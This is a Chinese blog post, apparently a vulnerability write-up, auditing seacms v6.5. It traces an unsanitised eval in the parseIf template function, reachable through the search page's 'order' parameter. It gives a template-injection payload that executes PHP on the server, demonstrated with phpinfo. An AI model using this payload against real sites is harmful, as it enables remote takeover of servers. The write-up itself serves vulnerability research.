@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="概述前段时间放在90sec上的一篇代码审计，收拾一下放到自己博客上">
+<meta name="keywords" content="cms">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【Code Review】seacms v6.5 前台getshell">
+<meta property="og:url" content="http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/index.html">
+<meta property="og:site_name" content="0kami&#39;s Blog">
+<meta property="og:description" content="概述前段时间放在90sec上的一篇代码审计，收拾一下放到自己博客上">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://blog.0kami.cn/img/seacms/1.png">
+<meta property="og:updated_time" content="2018-01-25T07:28:34.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="【Code Review】seacms v6.5 前台getshell">
+<meta name="twitter:description" content="概述前段时间放在90sec上的一篇代码审计，收拾一下放到自己博客上">
+<meta name="twitter:image" content="http://blog.0kami.cn/img/seacms/1.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>【Code Review】seacms v6.5 前台getshell</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- rss -->
+    
+    
+</head>
+
+<body>
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2018/02/03/MovieGuide2SQLi/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2017/03/15/old-njctf-2017/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&text=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&is_video=false&description=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【Code Review】seacms v6.5 前台getshell&body=Check out this article: http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&name=【Code Review】seacms v6.5 前台getshell&description=&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;前段时间放在&lt;a href=&quot;https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=10291&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;90sec&lt;/a&gt;上的一篇代码审计，收拾一下放到自己博客上&lt;br&gt;"><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index width mx-auto px2 my4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        【Code Review】seacms v6.5 前台getshell
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">0kami's Blog</span>
+      </span>
+      
+    <div class="postdate">
+        <time datetime="2017-03-16T07:47:15.000Z" itemprop="datePublished">2017-03-16</time>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa fa-tag"></i>
+        <a class="tag-link" href="/tags/cms/">cms</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>前段时间放在<a href="https://forum.90sec.org/forum.php?mod=viewthread&amp;tid=10291" target="_blank" rel="noopener">90sec</a>上的一篇代码审计，收拾一下放到自己博客上<br><a id="more"></a></p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>cms版本：6.45<br>直接上代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">function parseIf($content)&#123;</span><br><span class="line">		if (strpos($content,&apos;&#123;if:&apos;)=== false)&#123;</span><br><span class="line">		return $content;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">		$labelRule = buildregx(&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;,&quot;is&quot;);</span><br><span class="line">		$labelRule2=&quot;&#123;elseif&quot;;</span><br><span class="line">		$labelRule3=&quot;&#123;else&#125;&quot;;</span><br><span class="line">		preg_match_all($labelRule,$content,$iar);</span><br><span class="line">		$arlen=count($iar[0]);</span><br><span class="line">		$elseIfFlag=false;</span><br><span class="line">		for($m=0;$m&lt;$arlen;$m++)&#123;</span><br><span class="line">			$strIf=$iar[1][$m];</span><br><span class="line">			$strIf=$this-&gt;parseStrIf($strIf);</span><br><span class="line">			$strThen=$iar[2][$m];</span><br><span class="line">			$strThen=$this-&gt;parseSubIf($strThen);</span><br><span class="line">			if (strpos($strThen,$labelRule2)===false)&#123;</span><br><span class="line">				if (strpos($strThen,$labelRule3)&gt;=0)&#123;</span><br><span class="line">					$elsearray=explode($labelRule3,$strThen);</span><br><span class="line">					$strThen1=$elsearray[0];</span><br><span class="line">					$strElse1=$elsearray[1];</span><br><span class="line">                    echo &quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;;</span><br><span class="line">                    eval(&quot;if(&quot;.$strIf.&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;);</span><br><span class="line">					if ($ifFlag)&#123; $content=str_replace($iar[0][$m],$strThen1,$content);&#125; else &#123;$content=str_replace($iar[0][$m],$strElse1,$content);&#125;</span><br><span class="line">				&#125;else&#123;</span><br><span class="line">				@eval(&quot;if(&quot;.$strIf.&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;);</span><br><span class="line">				if ($ifFlag) $content=str_replace($iar[0][$m],$strThen,$content); else $content=str_replace($iar[0][$m],&quot;&quot;,$content);&#125;</span><br><span class="line">			&#125;else&#123;</span><br><span class="line">				$elseIfArray=explode($labelRule2,$strThen);</span><br><span class="line">				$elseIfArrayLen=count($elseIfArray);</span><br><span class="line">				$elseIfSubArray=explode($labelRule3,$elseIfArray[$elseIfArrayLen-1]);</span><br><span class="line">				$resultStr=$elseIfSubArray[1];</span><br><span class="line">				$elseIfArraystr0=addslashes($elseIfArray[0]);</span><br><span class="line">				@eval(&quot;if($strIf)&#123;\$resultStr=\&quot;$elseIfArraystr0\&quot;;&#125;&quot;);</span><br><span class="line">				for($elseIfLen=1;$elseIfLen&lt;$elseIfArrayLen;$elseIfLen++)&#123;</span><br><span class="line">					$strElseIf=getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">					$strElseIf=$this-&gt;parseStrIf($strElseIf);</span><br><span class="line">					$strElseIfThen=addslashes(getSubStrByFromAndEnd($elseIfArray[$elseIfLen],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">					@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen\&quot;;&#125;&quot;);</span><br><span class="line">					@eval(&quot;if(&quot;.$strElseIf.&quot;)&#123;\$elseIfFlag=true;&#125;else&#123;\$elseIfFlag=false;&#125;&quot;);</span><br><span class="line">					if ($elseIfFlag) &#123;break;&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				$strElseIf0=getSubStrByFromAndEnd($elseIfSubArray[0],&quot;:&quot;,&quot;&#125;&quot;,&quot;&quot;);</span><br><span class="line">				$strElseIfThen0=addslashes(getSubStrByFromAndEnd($elseIfSubArray[0],&quot;&#125;&quot;,&quot;&quot;,&quot;start&quot;));</span><br><span class="line">				if(strpos($strElseIf0,&apos;==&apos;)===false&amp;&amp;strpos($strElseIf0,&apos;=&apos;)&gt;0)$strElseIf0=str_replace(&apos;=&apos;, &apos;==&apos;, $strElseIf0);</span><br><span class="line">				@eval(&quot;if(&quot;.$strElseIf0.&quot;)&#123;\$resultStr=\&quot;$strElseIfThen0\&quot;;\$elseIfFlag=true;&#125;&quot;);</span><br><span class="line">				$content=str_replace($iar[0][$m],$resultStr,$content);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		return $content;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure></p>
+<p>上面主要逻辑为解析html文件中的{if:}{end if}标签代码，可以看到没有做任何处理就eval，那么我们查找一下对应调用的地方会不会有漏洞。<br>主要关注前台，找到一处解析搜索结果的页面（search.php），代码比较多，一点一点来看。<br>找到调用的位置line 212<code>$content=$mainClassObj-&gt;parseIf($content);</code><br>往上看，发现他的逻辑是先解析其他类型的标签，比如<code>{searchpage:page}</code><br>那么接下来的思路，主要是2点，查找对应if标签可控的位置，另一种就是查找其他标签的可控内容，写入if标签<br>我找到一处其他标签可控且没有做任何处理的位置，直接写入if标签语句即可造成任意代码执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function echoSearchPage()</span><br><span class="line">&#123;</span><br><span class="line">        global $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;</span><br><span class="line">        $order = !empty($order)?$order:time;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">$content = str_replace(&quot;&#123;searchpage:page&#125;&quot;,$page,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchword&#125;&quot;,$searchword,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;seacms:searchnum&#125;&quot;,$TotalResult,$content);</span><br><span class="line">        $content = str_replace(&quot;&#123;searchpage:ordername&#125;&quot;,$order,$content);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
+<p>order变量可控并且在调用parseIf函数前先解析，所以我们可以通过order写入if标签。<br>查看一下具体html代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class=&quot;btn-toolbar&quot; role=&quot;toolbar&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;btn-group&quot;&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-time-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;time&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderhits&quot;&gt;最新上映&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-hit-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;hit&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;orderaddtime&quot;&gt;最近热播&lt;/a&gt;</span><br><span class="line">      &lt;a href=&quot;&#123;searchpage:order-score-link&#125;&quot; &#123;if:&quot;&#123;searchpage:ordername&#125;&quot;==&quot;score&quot;&#125; class=&quot;btn btn-success&quot; &#123;else&#125; class=&quot;btn btn-default&quot; &#123;end if&#125; id=&quot;ordergold&quot;&gt;评分最高&lt;/a&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br></pre></td></tr></table></figure></p>
+<p>那么接下来就可以构造poc了，类似sql注入，我们先把前面的if标签语句闭合，写入恶意代码并闭合后面的if标签。<br>example：<code>}{end if}{if:1)phpinfo();if(1}{end if}</code><br>本地验证一下<br><img src="http://blog.0kami.cn/img/seacms/1.png" alt=""></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这是一个比较经典的漏洞，也可以被称为模版解析吧我觉得：）<br>ps: 后悔啊，没有先提交个poc平台T_T</p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+        </div>
+    </div>
+
+
+
+    </div>
+    
+      <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#概述"><span class="toc-number">1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#分析"><span class="toc-number">2.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#总结"><span class="toc-number">3.</span> <span class="toc-text">总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&text=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&is_video=false&description=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=【Code Review】seacms v6.5 前台getshell&body=Check out this article: http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&title=【Code Review】seacms v6.5 前台getshell"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://blog.0kami.cn/2017/03/16/old-seacms-v6-5-getshell/&name=【Code Review】seacms v6.5 前台getshell&description=&lt;h1 id=&quot;概述&quot;&gt;&lt;a href=&quot;#概述&quot; class=&quot;headerlink&quot; title=&quot;概述&quot;&gt;&lt;/a&gt;概述&lt;/h1&gt;&lt;p&gt;前段时间放在&lt;a href=&quot;https://forum.90sec.org/forum.php?mod=viewthread&amp;amp;tid=10291&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;90sec&lt;/a&gt;上的一篇代码审计，收拾一下放到自己博客上&lt;br&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
+</div>
+
+    
+    <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 0kami
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/categories/notes/">Notes</a></li>
+         
+          <li><a href="/categories/codereview/">CodeReview</a></li>
+         
+          <li><a href="/categories/ctf/">CTF</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+<link rel="stylesheet" href="/lib/meslo-LG/styles.css">
+<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+    <script type="text/javascript">
+        (function(i,s,o,g,r,a,m) {i['GoogleAnalyticsObject']=r;i[r]=i[r]||function() {
+        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+        ga('create', 'UA-37473492-6', 'auto');
+        ga('send', 'pageview');
+    </script>
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = '0kami';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
